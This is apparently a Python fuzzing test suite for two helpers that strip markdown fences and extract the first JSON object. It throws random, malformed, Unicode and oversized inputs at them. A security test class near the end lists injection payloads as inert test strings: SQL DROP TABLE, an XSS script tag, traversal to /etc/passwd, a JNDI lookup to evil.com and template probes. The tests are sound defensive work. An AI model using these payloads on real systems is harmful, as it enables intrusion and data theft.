"""
Fuzzing Tests for Text Processing
==================================

Aggressive fuzzing to discover crashes, hangs, and unexpected behavior.
Uses random, malformed, and adversarial inputs.

Strategy:
- Generate completely random inputs
- Test with malformed data
- Boundary value analysis
- Performance stress testing
"""

import json
import random
import string

from hypothesis import given, settings
from hypothesis import strategies as st

from app.utils.text_processing import extract_first_json_object, strip_markdown_fences


class TestStripMarkdownFencesFuzzing:
    """Aggressive fuzzing for strip_markdown_fences"""

    def test_fuzz_random_bytes(self):
        """Test with random byte sequences"""
        for _ in range(100):
            # Generate random bytes
            random_bytes = bytes(random.randint(0, 255) for _ in range(random.randint(0, 1000)))
            try:
                text = random_bytes.decode("utf-8", errors="ignore")
                result = strip_markdown_fences(text)
                assert isinstance(result, str)
            except Exception:
                # Should not crash
                pass

    def test_fuzz_random_backtick_patterns(self):
        """Test with random backtick patterns"""
        patterns = []
        for _ in range(200):
            num_backticks = random.randint(1, 20)
            pattern = "`" * num_backticks
            if random.choice([True, False]):
                pattern += "\n" + "".join(random.choices(string.printable, k=random.randint(0, 100)))
            if random.choice([True, False]):
                pattern += "\n" + "`" * random.randint(1, 20)
            patterns.append(pattern)

        for pattern in patterns:
            result = strip_markdown_fences(pattern)
            assert isinstance(result, str)

    def test_fuzz_mixed_control_characters(self):
        """Test with control characters"""
        control_chars = [chr(i) for i in range(32)]  # ASCII control characters

        for _ in range(50):
            text = "```\n"
            text += "".join(random.choices(control_chars + list(string.printable), k=100))
            text += "\n```"

            result = strip_markdown_fences(text)
            assert isinstance(result, str)

    def test_fuzz_extreme_lengths(self):
        """Test with extremely long inputs"""
        test_cases = [
            "```\n" + "x" * 1000000 + "\n```",  # 1MB
            "```" * 10000,  # Many backticks
            "\n" * 100000,  # Many newlines
        ]

        for text in test_cases:
            try:
                result = strip_markdown_fences(text)
                assert isinstance(result, str)
            except MemoryError:
                # Acceptable for extreme cases
                pass

    def test_fuzz_null_bytes(self):
        """Test with null bytes"""
        test_cases = [
            "```\n\x00\x00\x00\n```",
            "\x00```\ncode\n```",
            "```\ncode\x00\n```",
        ]

        for text in test_cases:
            result = strip_markdown_fences(text)
            assert isinstance(result, str)

    def test_fuzz_unicode_edge_cases(self):
        """Test with Unicode edge cases"""
        edge_cases = [
            "```\n\uffff\n```",  # Max BMP character
            "```\n\U0010ffff\n```",  # Max Unicode
            "```\n\u200b\u200c\u200d\n```",  # Zero-width characters
            "```\n\u0301\u0302\u0303\n```",  # Combining characters
            "```\n🔥💯✨\n```",  # Emojis
        ]

        for text in edge_cases:
            result = strip_markdown_fences(text)
            assert isinstance(result, str)

    @settings(max_examples=200, deadline=None)
    @given(st.text(max_size=10000))
    def test_fuzz_hypothesis_any_text(self, text):
        """Hypothesis-based fuzzing with any text"""
        result = strip_markdown_fences(text)
        assert isinstance(result, str)
        # Result should never be longer than input
        assert len(result) <= len(text) + 10  # Small margin for edge cases


class TestExtractFirstJsonObjectFuzzing:
    """Aggressive fuzzing for extract_first_json_object"""

    def test_fuzz_random_brace_patterns(self):
        """Test with random brace patterns"""
        for _ in range(200):
            braces = random.choices(["{", "}"], k=random.randint(1, 100))
            text = "".join(braces)

            result = extract_first_json_object(text)
            # Should not crash
            assert result is None or isinstance(result, str)

    def test_fuzz_random_json_like_structures(self):
        """Test with random JSON-like structures"""
        for _ in range(100):
            # Generate random JSON-like text
            parts = []
            depth = random.randint(0, 10)

            for _ in range(depth):
                parts.append("{")
                if random.choice([True, False]):
                    parts.append(f'"key{random.randint(0, 100)}": ')
                    parts.append(random.choice(['"value"', "123", "true", "false", "null"]))

            for _ in range(depth):
                parts.append("}")

            text = "".join(parts)
            result = extract_first_json_object(text)
            assert result is None or isinstance(result, str)

    def test_fuzz_malformed_json(self):
        """Test with intentionally malformed JSON"""
        malformed = [
            '{"key": "value"',  # Missing closing brace
            '{"key": }',  # Missing value
            '{: "value"}',  # Missing key
            '{"key" "value"}',  # Missing colon
            '{"key": "value",}',  # Trailing comma
            '{,}',  # Only comma
            '{"key": undefined}',  # Invalid value
            "{'key': 'value'}",  # Single quotes
        ]

        for text in malformed:
            result = extract_first_json_object(text)
            # Should handle gracefully
            assert result is None or isinstance(result, str)

    def test_fuzz_extreme_nesting(self):
        """Test with extreme nesting levels"""
        for depth in [10, 50, 100, 500]:
            nested = "{" * depth + '"value": "deep"' + "}" * depth

            try:
                result = extract_first_json_object(nested)
                if result:
                    assert result.count("{") == result.count("}")
            except RecursionError:
                # Acceptable for extreme nesting
                pass

    def test_fuzz_quote_escape_combinations(self):
        """Test with complex quote and escape combinations"""
        patterns = [
            '{"key": "\\"\\"\\""}',
            '{"key": "\\\\\\\\"}',
            '{"key": "\\\\\\""}',
            '{"key": "\\\\\\\\\\\\"}',
            '{"key": "\\"\\\\"}',
            '{"a": "\\"", "b": "\\""}',
        ]

        for pattern in patterns:
            result = extract_first_json_object(pattern)
            assert result is None or isinstance(result, str)

    def test_fuzz_mixed_string_content(self):
        """Test with various string content"""
        for _ in range(100):
            # Generate random string content
            content = "".join(
                random.choices(
                    string.printable + "\\\"{}[]", k=random.randint(0, 200)  # Include special chars
                )
            )

            text = f'{{"key": "{content}"}}'

            result = extract_first_json_object(text)
            assert result is None or isinstance(result, str)

    def test_fuzz_unicode_in_json(self):
        """Test with Unicode in JSON"""
        unicode_chars = ["مرحبا", "你好", "🔥", "\u0000", "\uffff", "\\u0041"]

        for char in unicode_chars:
            text = f'{{"key": "{char}"}}'
            result = extract_first_json_object(text)
            assert result is None or isinstance(result, str)

    def test_fuzz_large_json_objects(self):
        """Test with very large JSON objects"""
        for size in [100, 1000, 10000]:
            # Generate large JSON
            pairs = [f'"key{i}": "value{i}"' for i in range(size)]
            text = "{" + ", ".join(pairs) + "}"

            try:
                result = extract_first_json_object(text)
                if result:
                    assert result.startswith("{")
                    assert result.endswith("}")
            except MemoryError:
                pass

    def test_fuzz_json_with_random_whitespace(self):
        """Test JSON with random whitespace"""
        whitespace_chars = [" ", "\t", "\n", "\r"]

        for _ in range(50):
            ws = "".join(random.choices(whitespace_chars, k=random.randint(0, 50)))
            text = f'{ws}{{"key":{ws}"value"{ws}}}{ws}'

            result = extract_first_json_object(text)
            assert result is None or isinstance(result, str)

    @settings(max_examples=200, deadline=None)
    @given(st.text(max_size=5000))
    def test_fuzz_hypothesis_any_text(self, text):
        """Hypothesis-based fuzzing with any text"""
        result = extract_first_json_object(text)
        assert result is None or isinstance(result, str)

        # If result found, should be valid brace structure
        if result:
            assert result.count("{") == result.count("}")
            assert result.startswith("{")
            assert result.endswith("}")

    @settings(max_examples=100, deadline=None)
    @given(
        st.dictionaries(
            st.text(min_size=1, max_size=50),
            st.one_of(st.text(max_size=100), st.integers(), st.booleans(), st.none()),
            max_size=20,
        )
    )
    def test_fuzz_valid_json_always_extracted(self, data):
        """Property: Valid JSON should always be extractable"""
        json_str = json.dumps(data)
        text = f"prefix {json_str} suffix"

        result = extract_first_json_object(text)

        # Should find the JSON
        assert result is not None
        assert "{" in result


class TestCombinedFuzzing:
    """Fuzzing tests combining both functions"""

    def test_fuzz_pipeline_random_inputs(self):
        """Test pipeline with random inputs"""
        for _ in range(100):
            # Generate random text
            text = "".join(random.choices(string.printable, k=random.randint(0, 1000)))

            # Add random markdown fences
            if random.choice([True, False]):
                text = f"```\n{text}\n```"

            # Add random JSON
            if random.choice([True, False]):
                text += ' {"key": "value"}'

            # Process through pipeline
            stripped = strip_markdown_fences(text)
            assert isinstance(stripped, str)

            extracted = extract_first_json_object(stripped)
            assert extracted is None or isinstance(extracted, str)

    def test_fuzz_adversarial_inputs(self):
        """Test with adversarial inputs designed to break parsers"""
        adversarial = [
            "```" * 1000,
            "{" * 1000,
            "}" * 1000,
            '"\\"' * 1000,
            "\\" * 1000,
            "\x00" * 100,
            "```\n{{{{{{\n```",
            '```\n{"key": "```"}\n```',
            '{```}',
            '{"```": "```"}',
        ]

        for text in adversarial:
            try:
                stripped = strip_markdown_fences(text)
                extracted = extract_first_json_object(stripped)
                # Should not crash
                assert isinstance(stripped, str)
                assert extracted is None or isinstance(extracted, str)
            except Exception as e:
                # Log but don't fail - some adversarial inputs might cause issues
                print(f"Adversarial input caused: {type(e).__name__}")


class TestPerformanceFuzzing:
    """Fuzzing tests focused on performance"""

    def test_fuzz_performance_large_inputs(self):
        """Test performance with large inputs"""
        import time

        sizes = [1000, 10000, 100000]

        for size in sizes:
            text = "x" * size
            text = f"```\n{text}\n```"

            start = time.time()
            result = strip_markdown_fences(text)
            elapsed = time.time() - start

            # Should complete in reasonable time
            assert elapsed < 1.0  # 1 second max
            assert isinstance(result, str)

    def test_fuzz_performance_deep_nesting(self):
        """Test performance with deep nesting"""
        import time

        for depth in [10, 50, 100]:
            text = "{" * depth + "}" * depth

            start = time.time()
            result = extract_first_json_object(text)
            elapsed = time.time() - start

            # Should complete in reasonable time
            assert elapsed < 1.0
            assert result is None or isinstance(result, str)


class TestSecurityFuzzing:
    """Fuzzing tests for security vulnerabilities"""

    def test_fuzz_injection_patterns(self):
        """Test with injection-like patterns"""
        injection_patterns = [
            "'; DROP TABLE users; --",
            "<script>alert('xss')</script>",
            "../../../etc/passwd",
            "${jndi:ldap://evil.com/a}",
            "{{7*7}}",
            "${7*7}",
        ]

        for pattern in injection_patterns:
            text = f'{{"input": "{pattern}"}}'
            result = extract_first_json_object(text)
            # Should handle safely
            assert result is None or isinstance(result, str)

    def test_fuzz_buffer_overflow_attempts(self):
        """Test with patterns that might cause buffer overflows"""
        overflow_patterns = [
            "A" * 100000,
            "\x00" * 10000,
            "\xff" * 10000,
        ]

        for pattern in overflow_patterns:
            try:
                result = strip_markdown_fences(pattern)
                assert isinstance(result, str)
            except MemoryError:
                # Acceptable for extreme cases
                pass
